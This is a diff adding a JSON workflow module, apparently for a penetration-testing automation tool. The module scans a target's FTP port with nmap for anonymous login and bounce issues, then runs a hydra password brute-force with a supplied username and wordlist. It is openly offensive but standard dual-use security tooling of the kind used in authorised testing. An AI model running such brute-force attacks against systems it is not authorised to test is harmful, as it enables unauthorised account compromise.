@@ -1,0 +1,28 @@
+{
+  "name": "brute_ftp",
+  "description": "FTP brute-force: check for anonymous login then hydra password attack.",
+  "author": "james-linux",
+  "version": "1.0",
+  "requires_root": false,
+  "steps": [
+    {
+      "id": "nmap_ftp_check",
+      "action": "nmap.scan",
+      "params": {
+        "target": "{{target}}",
+        "ports": "21",
+        "flags": "-sV --script ftp-anon,ftp-bounce,ftp-syst"
+      },
+      "description": "Check FTP service, anonymous login, and bounce"
+    },
+    {
+      "id": "hydra_ftp",
+      "action": "layer.run",
+      "params": {
+        "command": "hydra -l {{username}} -P {{wordlist}} {{target}} ftp -t 8 -f -o /tmp/james_hydra_ftp.txt",
+        "timeout": 600
+      },
+      "description": "Hydra FTP password brute-force"
+    }
+  ]
+}
